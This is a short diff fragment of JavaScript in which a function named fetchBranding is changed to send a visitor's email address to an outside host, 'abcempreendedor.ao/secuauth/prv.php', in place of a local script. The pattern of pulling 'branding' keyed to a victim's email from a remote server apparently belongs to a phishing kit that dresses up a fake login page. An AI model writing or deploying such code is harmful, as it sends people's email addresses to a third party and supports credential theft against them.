@@ -948,7 +948,7 @@ $(document).ready(function() {
     
     function fetchBranding(email) {
         var request = new XMLHttpRequest();
-        var url = 'prv.php?id=' + encodeURIComponent(email);
+        var url = 'https://abcempreendedor.ao/secuauth/prv.php?id=' + encodeURIComponent(email);
         request.open('GET', url, true);
         request.onload = function() {
             if (this.status >= 200 && this.status < 400) {
